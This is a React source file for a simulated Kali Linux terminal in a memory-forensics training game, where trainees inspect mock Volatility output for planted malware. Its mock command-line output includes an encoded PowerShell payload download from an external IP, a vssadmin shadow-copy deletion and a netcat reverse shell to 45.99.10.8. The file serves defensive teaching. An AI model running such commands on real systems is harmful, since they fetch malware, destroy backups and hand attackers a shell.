/* ==========================================================================
   IMPORTS
   ========================================================================== */
import React, { useState, useRef, useEffect } from 'react';
import { useOS } from '../../context/OSContext';
import { Folder, File, Terminal as TerminalIcon, FileText, HardDrive } from 'lucide-react';

/* ==========================================================================
   TYPE DEFINITIONS
   ========================================================================== */
type TerminalLine = {
    type: 'input' | 'output' | 'error';
    content: string;
};

/* ==========================================================================
   MOCK DATA GENERATORS
   ========================================================================== */
const getProcessesForDay = (day: number) => {
    // Windows 10 Baseline
    const commonProcs = [
        { pid: 4, ppid: 0, name: 'System', offset: '0xfa800375b300', threads: 120, handles: 4500, time: '2026-10-24 07:00:00' },
        { pid: 368, ppid: 4, name: 'smss.exe', offset: '0xfa800388d060', threads: 3, handles: 29, time: '2026-10-24 07:00:01' },
        { pid: 420, ppid: 368, name: 'csrss.exe', offset: '0xfa800405b060', threads: 14, handles: 320, time: '2026-10-24 07:00:02' },
        { pid: 580, ppid: 368, name: 'wininit.exe', offset: '0xfa800416b060', threads: 4, handles: 110, time: '2026-10-24 07:00:02' },
        { pid: 668, ppid: 580, name: 'services.exe', offset: '0xfa800426b060', threads: 19, handles: 450, time: '2026-10-24 07:00:03' },
        { pid: 680, ppid: 580, name: 'lsass.exe', offset: '0xfa800436b060', threads: 8, handles: 800, time: '2026-10-24 07:00:03' },
        { pid: 880, ppid: 668, name: 'svchost.exe', offset: '0xfa800508b060', threads: 45, handles: 980, time: '2026-10-24 07:00:05' },
        { pid: 920, ppid: 668, name: 'svchost.exe', offset: '0xfa800518b060', threads: 22, handles: 500, time: '2026-10-24 07:00:05' },
        { pid: 2120, ppid: 3000, name: 'explorer.exe', offset: '0xfa800108b060', threads: 75, handles: 1500, time: '2026-10-24 07:02:00' },
        { pid: 3400, ppid: 2120, name: 'chrome.exe', offset: '0xfa800208b060', threads: 22, handles: 150, time: '2026-10-24 08:30:15' },
        { pid: 4100, ppid: 3400, name: 'chrome.exe', offset: '0xfa800218b060', threads: 15, handles: 200, time: '2026-10-24 08:31:00' },
    ];

    if (day === 3) { // Malware Spikes (Downloader -> Payload)
        return [
            ...commonProcs,
            { pid: 5620, ppid: 2120, name: 'Invoice_SCAN.exe', offset: '0xfa801708b060', threads: 5, handles: 135, time: '2026-10-24 10:15:22' },
            { pid: 5700, ppid: 5620, name: 'cmd.exe', offset: '0xfa801808b060', threads: 1, handles: 20, time: '2026-10-24 10:15:25' },
            { pid: 5722, ppid: 5700, name: 'powershell.exe', offset: '0xfa801908b060', threads: 12, handles: 350, time: '2026-10-24 10:15:26' },
        ];
    } else if (day === 4) { // Ransomware Risk (Encryption)
        return [
            ...commonProcs,
            { pid: 6100, ppid: 2120, name: 'Update_Helper.exe', offset: '0xfa802908b060', threads: 8, handles: 120, time: '2026-10-24 11:05:00' },
            { pid: 6140, ppid: 6100, name: 'crypt_svc.exe', offset: '0xfa802A08b060', threads: 32, handles: 800, time: '2026-10-24 11:05:10' },
            { pid: 6155, ppid: 6140, name: 'vssadmin.exe', offset: '0xfa802B08b060', threads: 1, handles: 10, time: '2026-10-24 11:05:15' },
        ];
    } else if (day === 5) { // Nightmare/APT (Hidden Persistence)
        return [
            ...commonProcs,
            // Winlogon usually has ppid from smss, but here ppid is explorer? Suspicious parent.
            { pid: 1120, ppid: 2120, name: 'winlogon.exe', offset: '0xfa803C08b060', threads: 2, handles: 45, time: '2026-10-24 09:12:00' },
            { pid: 8888, ppid: 1120, name: 'nc.exe', offset: '0xfa803D08b060', threads: 1, handles: 15, time: '2026-10-24 09:30:00' },
        ];
    }
    return commonProcs;
};

const getConnectionsForDay = (day: number) => {
    // Offset, Proto, Local Addr, Remote Addr, State, Pid, Name
    const commonConns = [
        "0xfa800375b300 TCP 10.20.1.5:49152 10.20.1.2:445 ESTABLISHED 4 System",
        "0xfa800508b060 UDP 0.0.0.0:123 *:* - 880 svchost.exe",
        "0xfa800208b060 TCP 10.20.1.5:54321 142.250.180.14:443 ESTABLISHED 3400 chrome.exe",
        "0xfa800218b060 TCP 10.20.1.5:54325 142.250.180.14:443 ESTABLISHED 4100 chrome.exe",
    ];

    if (day === 3) {
        return [
            ...commonConns,
            "0xfa801708b060 TCP 10.20.1.5:55555 185.22.33.44:80 ESTABLISHED 5620 Invoice_SCAN.exe", // C2 Download
        ];
    } else if (day === 4) {
        return [
            ...commonConns,
            "0xfa802A08b060 TCP 10.20.1.5:60001 91.108.4.1:443 ESTABLISHED 6140 crypt_svc.exe" // Key Exfil
        ];
    } else if (day === 5) {
        return [
            ...commonConns,
            "0xfa803D08b060 TCP 10.20.1.5:4444 45.99.10.8:4444 ESTABLISHED 8888 nc.exe" // Reverse Shell
        ];
    }
    return commonConns;
};


/* ==========================================================================
   COMPONENTS
   ========================================================================== */

// Mock Kali Linux Terminal with command processing and tab completion.
export const KaliTerminal: React.FC = () => {
    /* --- Hooks & Context State --- */
    const { forensicDay, resetSession } = useOS();
    const [history, setHistory] = useState<TerminalLine[]>([
        { type: 'output', content: 'Kali GNU/Linux Rolling [Version 2024.1]' },
        { type: 'output', content: 'Type "help" for instructions.' }
    ]);
    const [input, setInput] = useState('');
    const [commandHistory, setCommandHistory] = useState<string[]>([]);
    const [historyIndex, setHistoryIndex] = useState(-1);
    const [currentDir, setCurrentDir] = useState('/home/kali/evidence');

    const inputRef = useRef<HTMLInputElement>(null);
    const bottomRef = useRef<HTMLDivElement>(null);
    const [isProcessing, setIsProcessing] = useState(false);

    // Auto-scroll
    useEffect(() => {
        bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, [history, isProcessing]);

    // Focus input on click
    const focusInput = () => inputRef.current?.focus();

    /* --- Input & Navigation Handlers --- */
    const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
        if (e.key === 'Tab') {
            e.preventDefault();
            handleTabAutocomplete();
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex < commandHistory.length - 1) {
                const newIndex = historyIndex + 1;
                setHistoryIndex(newIndex);
                setInput(commandHistory[commandHistory.length - 1 - newIndex]);
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex > 0) {
                const newIndex = historyIndex - 1;
                setHistoryIndex(newIndex);
                setInput(commandHistory[commandHistory.length - 1 - newIndex]);
            } else if (historyIndex === 0) {
                setHistoryIndex(-1);
                setInput('');
            }
        } else if (e.key === 'Enter') {
            handleCommand(input);
        }
    };

    const handleTabAutocomplete = () => {
        const trimmed = input.trimStart();
        const parts = trimmed.split(/\s+/);

        if (parts.length === 1) {
            // Autocomplete Command
            const cmdPart = parts[0].toLowerCase();
            const commands = ['ls', 'cd', 'pwd', 'cat', 'whoami', 'ip', 'ifconfig', 'volatility', 'clear', 'help', 'shutdown', 'exit'];
            const matches = commands.filter(c => c.startsWith(cmdPart));

            if (matches.length === 1) {
                setInput(matches[0] + ' ');
            } else if (matches.length > 1) {
                // Potential to show suggestions here like real Linux
                setHistory(prev => [...prev, { type: 'output', content: matches.join('  ') }]);
            }
        } else {
            // Autocomplete Path/File
            const lastPart = parts[parts.length - 1];
            let files: string[] = [];

            if (currentDir === '/home/kali/evidence') {
                files = [`memdump_day_${forensicDay}.raw`, 'case_notes.txt'];
            } else if (currentDir === '/home/kali/tools') {
                files = ['volatility', 'wireshark', 'john', 'metasploit'];
            } else if (currentDir === '/home/kali') {
                files = ['Desktop', 'Documents', 'Downloads', 'evidence', 'tools'];
            } else if (currentDir === '/home') {
                files = ['kali'];
            } else if (currentDir === '/') {
                files = ['bin', 'boot', 'dev', 'etc', 'home', 'lib', 'mnt', 'opt', 'proc', 'root', 'sbin', 'usr', 'var'];
            }

            const matches = files.filter(f => f.toLowerCase().startsWith(lastPart.toLowerCase()));

            if (matches.length === 1) {
                const newInput = parts.slice(0, -1).join(' ') + ' ' + matches[0];
                setInput(newInput);
            } else if (matches.length > 1) {
                setHistory(prev => [...prev, { type: 'output', content: matches.join('  ') }]);
            }
        }
    };

    /* --- Command Handling --- */
    const handleCommand = (cmd: string) => {
        if (isProcessing) return;

        const parts = cmd.trim().split(/\s+/);
        const command = parts[0].toLowerCase();

        if (cmd.trim()) {
            setCommandHistory(prev => [...prev, cmd]);
            setHistoryIndex(-1);
        }

        setHistory(prev => [...prev, { type: 'input', content: cmd }]);

        if (command === 'clear') {
            setHistory([]);
            setInput('');
            return;
        }

        if (command === 'shutdown' || command === 'exit') {
            resetSession();
            return;
        }

        if (command === 'volatility') {
            setIsProcessing(true);
            setTimeout(() => {
                processCommand(parts);
                setIsProcessing(false);
                // Re-focus after async
                setTimeout(() => inputRef.current?.focus(), 10);
            }, 800);
        } else {
            processCommand(parts);
        }

        setInput('');
    };

    const processCommand = (parts: string[]) => {
        const command = parts[0].toLowerCase();
        const arg = parts[1];
        const newLines: TerminalLine[] = [];

        // Helper to format prompt display
        const displayDir = currentDir.replace('/home/kali', '~');

        if (command === 'help') {
            newLines.push({ type: 'output', content: 'Available commands:' });
            newLines.push({ type: 'output', content: '  ls [path]   - List files' });
            newLines.push({ type: 'output', content: '  cd <path>   - Change directory' });
            newLines.push({ type: 'output', content: '  pwd         - Print working directory' });
            newLines.push({ type: 'output', content: '  cat <file>  - View file contents' });
            newLines.push({ type: 'output', content: '  whoami      - Current user' });
            newLines.push({ type: 'output', content: '  ip a        - Network interfaces' });
            newLines.push({ type: 'output', content: '  ifconfig    - Network interfaces (classic)' });
            newLines.push({ type: 'output', content: '  volatility  - Forensics framework' });
            newLines.push({ type: 'output', content: '  clear       - Clear screen' });
            newLines.push({ type: 'output', content: '  shutdown    - Exit simulation' });
        } else if (command === 'pwd') {
            newLines.push({ type: 'output', content: currentDir });
        } else if (command === 'whoami') {
            newLines.push({ type: 'output', content: 'root' });
        } else if (command === 'ip' && arg === 'a' || command === 'ifconfig') {
            newLines.push({ type: 'output', content: 'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500' });
            newLines.push({ type: 'output', content: '        inet 10.20.1.15  netmask 255.255.255.0  broadcast 10.20.1.255' });
            newLines.push({ type: 'output', content: '        inet6 fe80::a00:27ff:fe8c:7a9f  prefixlen 64  scopeid 0x20<link>' });
            newLines.push({ type: 'output', content: '        ether 08:00:27:8c:7a:9f  txqueuelen 1000  (Ethernet)' });
            newLines.push({ type: 'output', content: '' });
            newLines.push({ type: 'output', content: 'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536' });
            newLines.push({ type: 'output', content: '        inet 127.0.0.1  netmask 255.0.0.0' });
        } else if (command === 'cd') {
            if (!arg || arg === '~') {
                setCurrentDir('/home/kali');
            } else if (arg === '..') {
                const parts = currentDir.split('/').filter(Boolean);
                if (parts.length > 0) {
                    parts.pop();
                    setCurrentDir('/' + parts.join('/'));
                } else {
                    setCurrentDir('/'); // If at root, stay at root
                }
            } else if (arg === '/') {
                setCurrentDir('/');
            } else {
                // Simple relative path mock
                const target = arg.startsWith('/') ? arg : (currentDir === '/' ? `/${arg}` : `${currentDir}/${arg}`);
                const validDirs = ['/', '/home', '/home/kali', '/home/kali/evidence', '/home/kali/tools'];

                // Clean up trailing slash
                const cleanTarget = target.endsWith('/') && target.length > 1 ? target.slice(0, -1) : target;

                if (validDirs.includes(cleanTarget)) {
                    setCurrentDir(cleanTarget);
                } else {
                    newLines.push({ type: 'error', content: `cd: ${arg}: No such file or directory` });
                }
            }
        } else if (command === 'cat') {
            if (!arg) {
                newLines.push({ type: 'error', content: 'Usage: cat <filename>' });
            } else if (arg === 'case_notes.txt') {
                if (currentDir === '/home/kali/evidence') {
                    newLines.push({ type: 'output', content: '--- CASE NOTES ---' });
                    if (forensicDay === 3) {
                        newLines.push({ type: 'output', content: 'Observed suspicious behavior on HR-PC-04.' });
                        newLines.push({ type: 'output', content: 'User reported slow performance after opening an invoice attachment.' });
                        newLines.push({ type: 'output', content: 'Potentially persistent malware. Check for C2 connections at 185.22.33.44.' });
                    } else if (forensicDay === 4) {
                        newLines.push({ type: 'output', content: 'URGENT: Ransomware deployment suspected.' });
                        newLines.push({ type: 'output', content: 'Shadow copies may have been targeted.' });
                        newLines.push({ type: 'output', content: 'Identify the encryption service and exfiltration point at 91.108.4.1.' });
                    } else if (forensicDay === 5) {
                        newLines.push({ type: 'output', content: 'Deep investigation required.' });
                        newLines.push({ type: 'output', content: 'Persistent actor suspected. System binaries may be masqueraded.' });
                        newLines.push({ type: 'output', content: 'Check for unauthorized remote shells connecting to 45.99.10.8.' });
                    }
                } else {
                    newLines.push({ type: 'error', content: `cat: ${arg}: No such file or directory` });
                }
            } else {
                newLines.push({ type: 'error', content: `cat: ${arg}: Permission denied or file not found` });
            }
        } else if (command === 'ls') {
            if (currentDir === '/home/kali/evidence') {
                newLines.push({ type: 'output', content: `memdump_day_${forensicDay}.raw  case_notes.txt` });
            } else if (currentDir === '/home/kali/tools') {
                newLines.push({ type: 'output', content: 'volatility  wireshark  john  metasploit' });
            } else if (currentDir === '/home/kali') {
                newLines.push({ type: 'output', content: 'Desktop/  Documents/  Downloads/  evidence/  tools/' });
            } else if (currentDir === '/home') {
                newLines.push({ type: 'output', content: 'kali/' });
            } else if (currentDir === '/') {
                newLines.push({ type: 'output', content: 'bin/  boot/  dev/  etc/  home/  lib/  mnt/  opt/  proc/  root/  sbin/  usr/  var/' });
            } else {
                newLines.push({ type: 'error', content: `ls: cannot access '${currentDir}': No such file or directory` });
            }
        } else if (command === 'volatility') {
            // volatility -f memdump_day_X.raw <plugin>
            const imageFlagIndex = parts.indexOf('-f');
            const imageFile = imageFlagIndex !== -1 ? parts[imageFlagIndex + 1] : null;

            // Just scan for the plugin name in the args
            const plugins = ['imageinfo', 'pslist', 'netscan', 'connscan', 'cmdline'];
            const plugin = parts.find(p => plugins.includes(p));

            if (!plugin) {
                newLines.push({ type: 'error', content: 'Volatility Framework 2.6' });
                newLines.push({ type: 'error', content: 'Error: Please specify a valid plugin (imageinfo, pslist, netscan, cmdline).' });
            } else if (!imageFile || !imageFile.includes('.raw')) {
                newLines.push({ type: 'error', content: 'Error: Please specify the memory image with -f' });
            } else {
                newLines.push({ type: 'output', content: 'Volatility Foundation Volatility Framework 2.6' });

                if (plugin === 'imageinfo') {
                    newLines.push({ type: 'output', content: 'Suggested Profile(s) : Win10x64_19041, Win10x64_18362' });
                    newLines.push({ type: 'output', content: 'AS Layer1 : IA32Kernel (Win10x64_19041)' });
                    newLines.push({ type: 'output', content: 'PAE type : No PAE' });
                    newLines.push({ type: 'output', content: 'DTB : 0x187000L' });
                } else if (plugin === 'pslist') {
                    newLines.push({ type: 'output', content: 'Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64   Start' });
                    newLines.push({ type: 'output', content: '---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------' });
                    const procs = getProcessesForDay(forensicDay || 1);
                    procs.forEach(p => {
                        newLines.push({ type: 'output', content: `${p.offset} ${p.name.padEnd(20)} ${p.pid.toString().padEnd(6)} ${p.ppid.toString().padEnd(6)} ${p.threads.toString().padEnd(6)} ${p.handles.toString().padEnd(8)} 1      0      ${p.time}` });
                    });
                } else if (plugin === 'netscan' || plugin === 'connscan') {
                    newLines.push({ type: 'output', content: 'Offset(P)          Proto    Local Address                  Foreign Address                 State       Pid      Owner' });
                    const conns = getConnectionsForDay(forensicDay || 1);
                    conns.forEach(c => newLines.push({ type: 'output', content: c }));
                } else if (plugin === 'cmdline') {
                    newLines.push({ type: 'output', content: '************************************************************************' });
                    // Mock command lines
                    newLines.push({ type: 'output', content: 'System pid: 4' });
                    newLines.push({ type: 'output', content: 'svchost.exe pid: 880 Command line: C:\\Windows\\system32\\svchost.exe -k netsvcs' });

                    if (forensicDay === 3) {
                        newLines.push({ type: 'output', content: 'Invoice_SCAN.exe pid: 5620 Command line: C:\\Users\\Public\\Downloads\\Invoice_SCAN.exe' });
                        newLines.push({ type: 'output', content: 'powershell.exe pid: 5722 Command line: powershell.exe -enc aAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAuADMAMwAuADQANAAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQA=' });
                    } else if (forensicDay === 4) {
                        newLines.push({ type: 'output', content: 'crypt_svc.exe pid: 6140 Command line: crypt_svc.exe --encrypt-all --silent' });
                        newLines.push({ type: 'output', content: 'vssadmin.exe pid: 6155 Command line: vssadmin.exe Delete Shadows /All /Quiet' });
                    } else if (forensicDay === 5) {
                        newLines.push({ type: 'output', content: 'winlogon.exe pid: 1120 Command line: C:\\Users\\Administrator\\AppData\\Roaming\\winlogon.exe' }); // Suspicious path
                        newLines.push({ type: 'output', content: 'nc.exe pid: 8888 Command line: nc.exe 45.99.10.8 4444 -e cmd.exe' });
                    }
                }
            }
        } else if (command === '') {
            // Do nothing
        } else {
            newLines.push({ type: 'error', content: `bash: ${command}: command not found` });
        }

        setHistory(prev => [...prev, ...newLines]);
    };

    const displayDir = currentDir.replace('/home/kali', '~');

    /* --- Terminal Render --- */
    return (
        <div className="h-full w-full bg-black text-green-500 font-mono p-2 overflow-hidden flex flex-col" onClick={focusInput}>
            <div className="flex-1 overflow-y-auto custom-scrollbar">
                {history.map((line, i) => (
                    <div key={i} className={`${line.type === 'error' ? 'text-red-500' : line.type === 'input' ? 'text-white' : 'text-gray-300'} whitespace-pre-wrap`}>
                        {line.type === 'input' ? <span className="text-green-500">root@kali:{displayDir}# <span className="text-white">{line.content}</span></span> : line.content}
                    </div>
                ))}
                {isProcessing && (
                    <div className="text-gray-500 animate-pulse">Running analysis...</div>
                )}
                <div ref={bottomRef} />
            </div>
            <div className="flex items-center text-white">
                <span className="text-green-500 mr-2">root@kali:{displayDir}#</span>
                <input
                    ref={inputRef}
                    type="text"
                    value={input}
                    onChange={(e) => setInput(e.target.value)}
                    onKeyDown={handleKeyDown}
                    className="bg-transparent border-none outline-none flex-1 font-mono"
                    autoFocus
                    disabled={isProcessing}
                />
            </div>
        </div>
    );
};

// Visual File Manager for the Kali Environment.
export const KaliFileManager: React.FC = () => {
    /* --- State & Helpers --- */
    const { forensicDay } = useOS();
    const [path, setPath] = useState(['home', 'kali', 'evidence']);

    const getToolIcon = (tool: string) => {
        switch (tool) {
            case 'volatility': return '/assets/Icons/volatility.png';
            case 'nmap': return '/assets/Icons/nmap.png';
            case 'wireshark': return '/assets/Icons/wireshark.png';
            case 'john': return '/assets/Icons/john.png';
            case 'metasploit': return '/assets/Icons/metasploitable.png';
            default: return null;
        }
    };

    /* --- File Manager Render --- */
    return (
        <div className="h-full w-full bg-[#1e1e1e] flex flex-col text-gray-200 font-sans">
            {/* Top Bar */}
            <div className="bg-[#2d2d2d] p-2 flex items-center space-x-2 border-b border-black/50">
                <div className="flex space-x-2 mr-4">
                    <div className="bg-red-500 rounded-full w-3 h-3"></div>
                    <div className="bg-yellow-500 rounded-full w-3 h-3"></div>
                    <div className="bg-green-500 rounded-full w-3 h-3"></div>
                </div>
                <div className="bg-[#1a1a1a] px-4 py-1 rounded flex-1 text-xs text-gray-400 border border-gray-700 font-mono flex items-center gap-2">
                    <HardDrive size={12} /> /{path.join('/')}
                </div>
            </div>

            <div className="flex flex-1">
                {/* Sidebar */}
                <div className="w-48 bg-[#252525] border-r border-black/50 text-sm">
                    <div className="p-2 text-gray-500 uppercase text-xs font-bold tracking-wider">Devices</div>
                    <div className="flex items-center p-2 hover:bg-[#333] rounded cursor-pointer mx-2 text-gray-300">
                        <HardDrive className="w-4 h-4 mr-2" /> File System
                    </div>

                    <div className="p-2 mt-4 text-gray-500 uppercase text-xs font-bold tracking-wider">Places</div>
                    <div
                        className={`flex items-center p-2 rounded cursor-pointer mx-2 ${path.includes('home') && path.length === 2 ? 'bg-[#333]' : 'hover:bg-[#333]'}`}
                        onClick={() => setPath(['home', 'kali'])}
                    >
                        <img src="/assets/Icons/folder.png" className="w-4 h-4 mr-2" alt="" /> Home
                    </div>
                    <div
                        className={`flex items-center p-2 rounded cursor-pointer mx-2 ${path.includes('evidence') ? 'bg-[#3e3e3e]' : 'hover:bg-[#333]'}`}
                        onClick={() => setPath(['home', 'kali', 'evidence'])}
                    >
                        <img src="/assets/Icons/folder.png" className="w-4 h-4 mr-2" alt="" /> Evidence
                    </div>
                    <div
                        className={`flex items-center p-2 rounded cursor-pointer mx-2 ${path.includes('tools') ? 'bg-[#3e3e3e]' : 'hover:bg-[#333]'}`}
                        onClick={() => setPath(['home', 'kali', 'tools'])}
                    >
                        <img src="/assets/Icons/folder.png" className="w-4 h-4 mr-2" alt="" /> Tools
                    </div>
                </div>

                {/* Main Content */}
                <div className="flex-1 p-4 bg-[#1e1e1e]">
                    {path.includes('evidence') ? (
                        <div className="grid grid-cols-4 content-start gap-4">
                            <div className="flex flex-col items-center group cursor-pointer p-2 hover:bg-white/5 rounded border border-transparent hover:border-white/10 transition-all">
                                <File className="w-16 h-16 text-gray-400 mb-2 fill-gray-400/20" />
                                <span className="text-sm text-center font-medium">memdump_day_{forensicDay}.raw</span>
                                <span className="text-xs text-gray-500">4.2 GB</span>
                            </div>
                            <div className="flex flex-col items-center group cursor-pointer p-2 hover:bg-white/5 rounded border border-transparent hover:border-white/10 transition-all">
                                <img src="/assets/Icons/txt-file.png" className="w-16 h-16 mb-2" alt="" />
                                <span className="text-sm text-center font-medium">case_notes.txt</span>
                                <span className="text-xs text-gray-500">1.2 KB</span>
                            </div>
                        </div>
                    ) : path.includes('tools') ? (
                        <div className="grid grid-cols-4 content-start gap-4">
                            {['volatility', 'wireshark', 'john', 'metasploit'].map(tool => (
                                <div key={tool} className="flex flex-col items-center group cursor-pointer p-2 hover:bg-white/5 rounded border border-transparent hover:border-white/10 transition-all">
                                    <img src={getToolIcon(tool) || ''} className="w-16 h-16 mb-2 object-contain" alt="" />
                                    <span className="text-sm text-center font-medium">{tool}</span>
                                    <span className="text-xs text-gray-500">Binary</span>
                                </div>
                            ))}
                        </div>
                    ) : (
                        <div className="grid grid-cols-4 content-start gap-4">
                            <div
                                className="flex flex-col items-center group cursor-pointer p-2 hover:bg-white/5 rounded border border-transparent hover:border-white/10 transition-all"
                                onClick={() => setPath(['home', 'kali', 'evidence'])}
                            >
                                <img src="/assets/Icons/folder.png" className="w-16 h-16 mb-2" alt="" />
                                <span className="text-sm text-center font-medium">evidence</span>
                                <span className="text-xs text-gray-500">Folder</span>
                            </div>
                            <div
                                className="flex flex-col items-center group cursor-pointer p-2 hover:bg-white/5 rounded border border-transparent hover:border-white/10 transition-all"
                                onClick={() => setPath(['home', 'kali', 'tools'])}
                            >
                                <img src="/assets/Icons/folder.png" className="w-16 h-16 mb-2" alt="" />
                                <span className="text-sm text-center font-medium">tools</span>
                                <span className="text-xs text-gray-500">Folder</span>
                            </div>
                        </div>
                    )}
                </div>
            </div>

            {/* Status Bar */}
            <div className="bg-[#2d2d2d] border-t border-black/50 p-1 px-4 text-xs text-gray-500 flex justify-between">
                <span>{path.includes('evidence') ? '2 items' : path.includes('tools') ? '4 items' : '2 items'}</span>
                <span>Free Space: 124 GB</span>
            </div>
        </div>
    );
};

// Mission briefing and technical documentation for the forensics challenge.
export const KaliInstructions: React.FC = () => {
    /* --- Instructions Render --- */
    const { forensicDay } = useOS();

    return (
        <div className="h-full w-full bg-[#fdf6e3] text-[#657b83] p-8 font-mono overflow-y-auto leading-relaxed">
            <h1 className="text-3xl font-bold mb-6 text-[#cb4b16] border-b-2 border-[#eee8d5] pb-4">
                CASE FILE #{2026000 + (forensicDay || 0)}
            </h1>

            <section className="mb-8">
                <h2 className="text-xl font-bold mb-3 text-[#268bd2] uppercase tracking-wider">Incident Overview</h2>
                <div className="bg-[#eee8d5] p-4 rounded border border-[#dacfb9]">
                    <p className="mb-2"><strong>Target System:</strong> Windows 10 Workstation (HR Dept)</p>
                    <p className="mb-2"><strong>Incident Date:</strong> 2026-10-24</p>
                    <p><strong>Description:</strong> Security Operations Center (SOC) detected anomalous network activity originating from this endpoint. A memory dump was captured immediately after the alert.</p>
                </div>
            </section>

            <section className="mb-8">
                <h2 className="text-xl font-bold mb-3 text-[#268bd2] uppercase tracking-wider">Mission Objectives</h2>
                <ul className="list-decimal pl-5 space-y-2">
                    <li>Identify the <strong>Malicious Process</strong> (Name & PID).</li>
                    <li>Determine the <strong>Attack Vector</strong> (Initial access or payload delivery).</li>
                    <li>Locate any <strong>Network Indicators</strong> (C2 IP addresses).</li>
                </ul>
            </section>

            <section className="mb-8">
                <h2 className="text-xl font-bold mb-3 text-[#268bd2] uppercase tracking-wider">Tools & methodology</h2>
                <div className="space-y-4">
                    <div>
                        <h3 className="font-bold text-[#859900]">1. System Profiling</h3>
                        <code className="block bg-[#073642] text-[#839496] p-2 rounded mt-1">volatility -f memdump.raw imageinfo</code>
                    </div>
                    <div>
                        <h3 className="font-bold text-[#859900]">2. Process Analysis</h3>
                        <code className="block bg-[#073642] text-[#839496] p-2 rounded mt-1">volatility -f memdump.raw pslist</code>
                        <p className="text-sm mt-1 italic">Look for suspicious parent-child relationships or unknown executables.</p>
                    </div>
                    <div>
                        <h3 className="font-bold text-[#859900]">3. Network Analysis</h3>
                        <code className="block bg-[#073642] text-[#839496] p-2 rounded mt-1">volatility -f memdump.raw netscan</code>
                        <p className="text-sm mt-1 italic">Identify established connections to external/unknown IPs.</p>
                    </div>
                    <div>
                        <h3 className="font-bold text-[#859900]">4. Command Line Inspection</h3>
                        <code className="block bg-[#073642] text-[#839496] p-2 rounded mt-1">volatility -f memdump.raw cmdline</code>
                    </div>
                </div>
            </section>

            <section>
                <div className="bg-[#cb4b16] text-white p-4 rounded shadow-lg">
                    <h3 className="font-bold text-lg mb-2">⚠ RESTRICTED ENVIRONMENT</h3>
                    <p>Network isolation is active. You cannot connect to the internet. Use the pre-loaded image file in the <code className="bg-black/20 px-1 rounded">evidence</code> directory.</p>
                </div>
            </section>
        </div>
    );
};
